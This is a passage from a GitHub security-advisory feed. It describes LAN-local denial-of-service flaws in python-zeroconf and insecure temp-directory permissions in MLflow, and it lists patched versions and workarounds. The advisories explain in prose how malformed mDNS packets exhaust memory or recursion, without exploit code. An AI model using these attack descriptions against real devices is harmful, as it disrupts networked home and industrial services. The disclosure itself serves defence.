<li><a href="https://github.com/python-zeroconf/python-zeroconf/pull/1718">https://github.com/python-zeroconf/python-zeroconf/pull/1718</a></li>
<li><a href="https://github.com/advisories/GHSA-rfg2-pjw2-56x2">https://github.com/advisories/GHSA-rfg2-pjw2-56x2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rfg2-pjw2-56x2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-29T20:18:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[zeroconf] zeroconf: Unbounded exception-dedup state retains packet buffers via traceback frame locals, enabling LAN-local memory exhaustion]]></title>
        <id>https://github.com/advisories/GHSA-phvx-9mgw-67r5</id>
        <link href="https://github.com/advisories/GHSA-phvx-9mgw-67r5"/>
        <updated>2026-05-29T20:13:08.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>DNSIncoming._log_exception_debug</code> and the four <code>QuietLogger</code> exception-dedup methods stored an unbounded <code>_seen_logs</code> dict keyed by <code>str(sys.exc_info()[1])</code>. The seven <code>IncomingDecodeError</code> messages raised from <code>_read_name</code> / <code>_decode_labels_at_offset</code> (RFC 6762 §18 name-decoding error paths) all embed <code>self.source</code> — the peer's ephemeral source port, varying per packet — plus byte <code>offset</code> and pointer <code>link</code>, so every attacker-influenced combination produced a fresh dedup key. The stored value was the full <code>sys.exc_info()</code> triple, whose traceback's frame locals retained <code>self.data</code> (the raw inbound packet, up to 8966 bytes per RFC 6762 §17). Each unique malformed packet therefore pinned ~9 KB until process exit.</p>
<p>Any unauthenticated host on the local link (UDP/5353, <code>224.0.0.251</code> / <code>ff02::fb</code>) can drive memory growth at line rate; that includes a guest on the same Wi-Fi, a compromised IoT device, or a container on a shared bridge. On memory-constrained deployments (Home Assistant on Raspberry-Pi-class hardware is the canonical victim) sustained traffic trivially OOM-kills the process, and mDNS-dependent features (HomeKit, Chromecast/Matter, AirPlay, printers) degrade or fail.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <code>zeroconf</code> 0.149.6 (<a href="https://github.com/python-zeroconf/python-zeroconf/pull/1717">PR #1717</a>). Upgrade to <code>&gt;= 0.149.6</code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no in-process workaround; upgrading is the fix. Otherwise, restrict mDNS (UDP/5353) to trusted Layer-2 segments via AP client isolation, guest-network separation, or host firewall rules.</p>
<h3 id="resources">Resources</h3>
<ul>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/pull/1717">PR #1717</a>, fix</li>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/issues/1714">Issue #1714</a>, public tracking issue</li>
<li><a href="https://www.rfc-editor.org/rfc/rfc6762#section-17">RFC 6762 §17</a>, <a href="https://www.rfc-editor.org/rfc/rfc6762#section-18">RFC 6762 §18</a>, <a href="https://cwe.mitre.org/data/definitions/400.html">CWE-400</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/security/advisories/GHSA-phvx-9mgw-67r5">https://github.com/python-zeroconf/python-zeroconf/security/advisories/GHSA-phvx-9mgw-67r5</a></li>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/issues/1714">https://github.com/python-zeroconf/python-zeroconf/issues/1714</a></li>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/pull/1717">https://github.com/python-zeroconf/python-zeroconf/pull/1717</a></li>
<li><a href="https://github.com/advisories/GHSA-phvx-9mgw-67r5">https://github.com/advisories/GHSA-phvx-9mgw-67r5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-phvx-9mgw-67r5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-29T20:13:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[zeroconf] zeroconf has unbounded recursion in DNS compression-pointer decoder that allows LAN-local denial of service]]></title>
        <id>https://github.com/advisories/GHSA-9pgc-3ccv-5297</id>
        <link href="https://github.com/advisories/GHSA-9pgc-3ccv-5297"/>
        <updated>2026-05-29T20:09:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>DNSIncoming._decode_labels_at_offset</code> recurses once per DNS-name compression pointer (RFC 1035 §4.1.4). Pointer cycles and label counts were capped, but the chain length of unique forward pointers was not. A single ~3 kB mDNS packet carrying ~1500 chained pointers drives the recursion past CPython's default limit, and <code>RecursionError</code> was not listed in <code>DECODE_EXCEPTIONS</code>, so it escaped <code>DNSIncoming.__init__</code> and was logged by asyncio's default exception handler.</p>
<p>Any unauthenticated host on the local link (UDP/5353, <code>224.0.0.251</code> / <code>ff02::fb</code>) can degrade the mDNS listener; that includes a guest on the same Wi-Fi, a compromised IoT device, or a container on a shared bridge. Replaying at a few hertz produces sustained CPU burn and log flooding, and mDNS-dependent features (HomeKit, Chromecast/Matter, AirPlay, printers) degrade while the attack is in flight.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <code>zeroconf</code> 0.149.5 (<a href="https://github.com/python-zeroconf/python-zeroconf/pull/1719">PR #1719</a>).
Upgrade to <code>&gt;= 0.149.5</code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no in-process workaround; upgrading is the fix. Otherwise, restrict mDNS (UDP/5353) to trusted Layer-2 segments via AP client isolation, guest-network separation, or host firewall rules.</p>
<h3 id="resources">Resources</h3>
<ul>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/pull/1719">PR #1719</a>, fix</li>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/issues/1713">Issue #1713</a>, public tracking issue</li>
<li><a href="https://www.rfc-editor.org/rfc/rfc1035#section-4.1.4">RFC 1035 §4.1.4</a>, <a href="https://www.rfc-editor.org/rfc/rfc6762">RFC 6762</a>, <a href="https://cwe.mitre.org/data/definitions/674.html">CWE-674</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/security/advisories/GHSA-9pgc-3ccv-5297">https://github.com/python-zeroconf/python-zeroconf/security/advisories/GHSA-9pgc-3ccv-5297</a></li>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/issues/1713">https://github.com/python-zeroconf/python-zeroconf/issues/1713</a></li>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/pull/1719">https://github.com/python-zeroconf/python-zeroconf/pull/1719</a></li>
<li><a href="https://github.com/advisories/GHSA-9pgc-3ccv-5297">https://github.com/advisories/GHSA-9pgc-3ccv-5297</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9pgc-3ccv-5297</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-29T20:09:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLFlow Creates a Temporary File With Insecure Permissions ]]></title>
        <id>https://github.com/advisories/GHSA-f2m9-wcf4-cwwx</id>
        <link href="https://github.com/advisories/GHSA-f2m9-wcf4-cwwx"/>
        <updated>2026-05-29T19:53:37.000Z</updated>
        <content type="html"><![CDATA[<p>In mlflow/mlflow versions prior to 3.11.0, the <code>get_or_create_nfs_tmp_dir()</code> function in <code>mlflow/utils/file_utils.py</code> creates temporary directories with world-writable permissions (0o777), and the <code>_create_model_downloading_tmp_dir()</code> function in <code>mlflow/pyfunc/__init__.py</code> creates directories with group-writable permissions (0o770). These insecure permissions allow local attackers to tamper with model artifacts, such as cloudpickle-serialized Python objects, and achieve arbitrary code execution when the tampered artifacts are deserialized via <code>cloudpickle.load()</code>. This vulnerability is particularly critical in environments with shared NFS mounts, such as Databricks, where NFS is enabled by default. The issue is a continuation of the vulnerability class addressed in CVE-2025-10279, which was only partially fixed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4137">https://nvd.nist.gov/vuln/detail/CVE-2026-4137</a></li>
<li><a href="https://github.com/mlflow/mlflow/commit/1dcbb0c2fbd1f446c328830e601ca13a28219b8a">https://github.com/mlflow/mlflow/commit/1dcbb0c2fbd1f446c328830e601ca13a28219b8a</a></li>
<li><a href="https://huntr.com/bounties/648dc30b-76c7-4433-86b8-f43d926fd8d6">https://huntr.com/bounties/648dc30b-76c7-4433-86b8-f43d926fd8d6</a></li>
<li><a href="https://github.com/advisories/GHSA-4x5p-f36r-mxxr">https://github.com/advisories/GHSA-4x5p-f36r-mxxr</a></li>
<li><a href="https://github.com/advisories/GHSA-f2m9-wcf4-cwwx">https://github.com/advisories/GHSA-f2m9-wcf4-cwwx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f2m9-wcf4-cwwx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-18T21:31:53.000Z</published>
    </entry>
</feed>